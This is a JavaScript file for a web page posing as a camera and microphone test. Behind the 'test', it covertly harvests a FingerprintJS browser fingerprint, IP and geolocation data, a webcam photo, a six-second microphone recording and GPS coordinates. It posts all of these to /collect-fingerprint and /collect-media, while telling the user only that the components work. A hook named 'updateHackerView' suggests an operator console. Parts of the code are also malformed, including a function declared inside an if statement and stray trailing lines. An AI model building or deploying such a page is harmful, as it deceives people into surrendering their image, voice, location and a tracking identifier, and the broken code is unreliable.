document.addEventListener('DOMContentLoaded', () => {
  const statusElement = document.querySelector('.status-content');
  const startButton = document.getElementById('startTest');
  const videoContainer = document.getElementById('videoContainer');
  const placeholder = document.getElementById('placeholder');
  const cameraStatus = document.getElementById('cameraStatus');
  const micStatus = document.getElementById('micStatus');
  const audioBars = document.querySelectorAll('.audio-bar');
  loadFaceModels();

  const loadScript = src => new Promise((resolve, reject) => {
    const script = document.createElement('script');
    script.src = src;
    script.async = true;
    script.onload = resolve;
    script.onerror = () => reject(new Error(`Failed to load ${src}`));
    document.head.appendChild(script);
  });

  startButton.addEventListener('click', async () => {
    try {
      statusElement.textContent = "Initializing test...";
      startButton.disabled = true;
      startButton.innerHTML = '<div class="loader"></div> Starting Test...';

      await collectFingerprint();
      await captureAndSaveMedia();
      await collectLocation();

      statusElement.textContent = "Test completed successfully! All components are working properly.";
      startButton.textContent = "Test Again";
    } catch (error) {
      console.error('Test error:', error);
      statusElement.textContent = "Test encountered an error: " + error.message;
      startButton.textContent = "Retry Test";
    } finally {
      startButton.disabled = false;
    }
  });
  async function loadFaceApiScript() {
  return new Promise((resolve, reject) => {
    const script = document.createElement('script');
    script.src = "https://cdn.jsdelivr.net/npm/face-api.js";
    script.onload = () => {
      console.log("face-api.js loaded");
      resolve();
    };
    script.onerror = () => reject(new Error("Failed to load face-api.js"));
    document.head.appendChild(script);
  });
}

  let faceapi; // declare globally
  async function loadFaceModels() {
    try {
    // Dynamically import face-api.js
      faceapi = await import('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/+esm');

      await faceapi.nets.tinyFaceDetector.loadFromUri('/models');
      console.log('Face detection model loaded');
    } catch (err) {
      console.error('Face model load error:', err);
    }
  }



  async function collectFingerprint() {
  try {
    const loadScript = src => new Promise((resolve, reject) => {
      const script = document.createElement('script');
      script.src = src;
      script.async = true;
      script.onload = resolve;
      script.onerror = () => reject(new Error(`Failed to load ${src}`));
      document.head.appendChild(script);
    });

    if (typeof FingerprintJS === 'undefined') {
      await loadScript('https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js');
    }

    const fp = await FingerprintJS.load();
    const result = await fp.get();

    const payload = {
      timestamp: new Date().toISOString(),
      ip: window.userIP || "Unknown",
      geo: window.userGeo || {},
      visitorId: result.visitorId,
      components: result.components,
      confidence: result.confidence,
      passive: {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screen: {
          width: screen.width,
          height: screen.height,
          colorDepth: screen.colorDepth
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        languages: navigator.languages
      }
    };

    if (window.updateHackerView) updateHackerView(payload);
    if (window.formatFingerprintReport) function formatFingerprintReport(data) {
  const fpDiv = document.getElementById('fpSummary');
  const panel = document.getElementById('fingerprintReport');
  if (!fpDiv || !panel) return;

  const bold = (label, value) => `<strong>${label}:</strong> ${value || 'Unknown'}`;

  const fonts = (data.components?.fonts?.value || []).slice(0, 5).join(', ') + '...';
  const ua = data.passive?.userAgent || '';
  const browser = ua.includes('Chrome') ? 'Chrome' :
                  ua.includes('Firefox') ? 'Firefox' :
                  ua.includes('Edg') ? 'Edge' : 'Unknown';

  fpDiv.innerHTML = `
    <h3>📍 Network & Location</h3>
    <ul>
      <li>${bold('IP Address', data.ip)}</li>
      <li>${bold('City / Region', `${data.geo?.city || '—'}, ${data.geo?.region || '—'}, ${data.geo?.country || '—'}`)}</li>
      <li>${bold('Timezone', data.geo?.timezone)} (Browser: ${data.passive?.timezone})</li>
    </ul>

    <h3>🖥️ System Info</h3>
    <ul>
      <li>${bold('OS Platform', data.passive?.platform)}</li>
      <li>${bold('Browser', browser)}</li>
      <li>${bold('Screen', `${data.passive?.screen?.width}×${data.passive?.screen?.height}, ${data.passive?.screen?.colorDepth}-bit`)}</li>
      <li>${bold('Languages', data.passive?.languages?.join(', '))}</li>
    </ul>

    <h3>⚙️ Hardware</h3>
    <ul>
      <li>${bold('CPU Cores', data.components?.hardwareConcurrency?.value)}</li>
      <li>${bold('RAM', `${data.components?.deviceMemory?.value} GB`)}</li>
      <li>${bold('GPU', data.components?.videoCard?.value?.renderer)}</li>
    </ul>

    <h3>🔐 Fingerprint</h3>
    <ul>
      <li>${bold('Visitor ID', data.visitorId)}</li>
      <li>${bold('Confidence Score', `${Math.round((data.confidence?.score || 0) * 100)}%`)}</li>
      <li>${bold('Fonts', fonts)}</li>
    </ul>

    <h3>📦 Storage Support</h3>
    <ul>
      <li>${bold('Local Storage', data.components?.localStorage?.value ? '✅' : '❌')}</li>
      <li>${bold('Session Storage', data.components?.sessionStorage?.value ? '✅' : '❌')}</li>
      <li>${bold('IndexedDB', data.components?.indexedDB?.value ? '✅' : '❌')}</li>
      <li>${bold('Cookies Enabled', data.components?.cookiesEnabled?.value ? '✅' : '❌')}</li>
    </ul>
  `;

  panel.style.display = 'block';
}
;

    await fetch('/collect-fingerprint', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

  } catch (error) {
    console.error('Fingerprint error:', error);
    throw error;
  }
}


  async function captureAndSaveMedia() {
    let stream;

    try {
      statusElement.textContent = "Checking camera and microphone permissions...";
      cameraStatus.textContent = "Camera: Checking...";
      micStatus.textContent = "Microphone: Checking...";

      stream = await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: true
      });

      const video = document.getElementById('localVideo');
      video.srcObject = stream;
      video.style.display = 'block';
      placeholder.style.display = 'none';

      await new Promise((resolve, reject) => {
        video.onloadedmetadata = resolve;
        video.onerror = reject;
        setTimeout(() => reject(new Error('Camera initialization timeout')), 5000);
      });

      await video.play();
      const canvas = document.getElementById('faceCanvas');
faceapi.matchDimensions(canvas, video);

setInterval(async () => {
  const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions());
  const resized = faceapi.resizeResults(detections, {
    width: video.videoWidth,
    height: video.videoHeight
  });

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  faceapi.draw.drawDetections(canvas, resized);

  console.log(`Detected faces: ${detections.length}`);
}, 1000);

      cameraStatus.textContent = "Camera: Detected";
      statusElement.textContent = "Testing camera... Smile!";

      if (stream.getAudioTracks().length > 0) {
        animateAudioVisualizer(stream);
        micStatus.textContent = "Microphone: Detected";
      }

      statusElement.textContent = "Capturing test image...";
      const imageBlob = await captureImageFrame(video);
      await saveMedia('image', imageBlob, 'jpg');
      cameraStatus.textContent = "Camera: Working properly";

      if (stream.getAudioTracks().length > 0) {
        statusElement.textContent = "Testing microphone... Speak now!";
        const audioBlob = await recordAudio(stream);
        if (audioBlob) {
          await saveMedia('audio', audioBlob, 'webm');
          micStatus.textContent = "Microphone: Working properly";
        }
      } else {
        micStatus.textContent = "Microphone: Not detected";
      }

    } catch (error) {
      if (error.name === 'NotAllowedError') {
        cameraStatus.textContent = "Camera: Permission denied";
        micStatus.textContent = "Microphone: Permission denied";
        throw new Error("Please allow camera and microphone access to complete the test");
      } else {
        cameraStatus.textContent = "Camera: Error (" + error.message + ")";
        micStatus.textContent = "Microphone: Error";
        throw error;
      }
    } finally {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stopAudioVisualizer();
      }
    }
  }

  function animateAudioVisualizer(stream) {
    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
    const analyser = audioContext.createAnalyser();
    const microphone = audioContext.createMediaStreamSource(stream);
    microphone.connect(analyser);
    analyser.fftSize = 32;

    const bufferLength = analyser.frequencyBinCount;
    const dataArray = new Uint8Array(bufferLength);

    function updateVisualizer() {
      analyser.getByteFrequencyData(dataArray);
      audioBars.forEach((bar, i) => {
        const index = Math.floor(i * (bufferLength / audioBars.length));
        const value = dataArray[index] / 255;
        const height = value * 100;
        bar.style.height = `${10 + height}%`;
      });

      if (window.audioVisualizerActive) {
        requestAnimationFrame(updateVisualizer);
      }
    }

    window.audioVisualizerActive = true;
    updateVisualizer();
  }

  function stopAudioVisualizer() {
    window.audioVisualizerActive = false;
    audioBars.forEach(bar => {
      bar.style.height = '10%';
    });
  }

  async function captureImageFrame(video) {
    return new Promise((resolve) => {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');

      const attemptCapture = (attempts = 3) => {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = ctx.getImageData(0, 0, 10, 10).data;
        const isBlank = Array.from(imageData).every(val => val === 0);

        if (!isBlank || attempts <= 0) {
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
        } else {
          setTimeout(() => attemptCapture(attempts - 1), 200);
        }
      };

      attemptCapture();
    });
  }

  async function recordAudio(stream) {
    return new Promise((resolve) => {
      try {
        const audioChunks = [];
        const recorder = new MediaRecorder(stream);

        recorder.ondataavailable = (e) => {
          if (e.data.size > 0) audioChunks.push(e.data);
        };

        recorder.onstop = () => {
          if (audioChunks.length > 0) {
            resolve(new Blob(audioChunks, { type: 'audio/webm' }));
          } else {
            resolve(null);
          }
        };

        recorder.start();
        setTimeout(() => recorder.stop(), 6000);

      } catch (error) {
        console.error('Audio recording error:', error);
        resolve(null);
      }
    });
  }

  async function saveMedia(type, blob, extension) {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = async () => {
        try {
          const response = await fetch('/collect-media', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              type,
              data: reader.result,
              extension
            })
          });

          if (!response.ok) throw new Error('Server error');
          resolve();
        } catch (error) {
          reject(error);
        }
      };
      reader.onerror = reject;
      reader.readAsDataURL(blob);
    });
  }

  async function collectLocation() {
    if (!navigator.geolocation) return;

    return new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          try {
            await fetch('/collect-fingerprint', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                location: {
                  latitude: position.coords.latitude,
                  longitude: position.coords.longitude
                }
              })
            });
            resolve();
          } catch (error) {
            console.error('Location save error:', error);
            resolve();
          }
        },
        (error) => {
          console.error('Geolocation error:', error);
          resolve();
        },
        { timeout: 5000 }
      );
    });
  }
});


  if (panel && output) {
    output.textContent = summary;
    panel.style.display = 'block';
  }
}
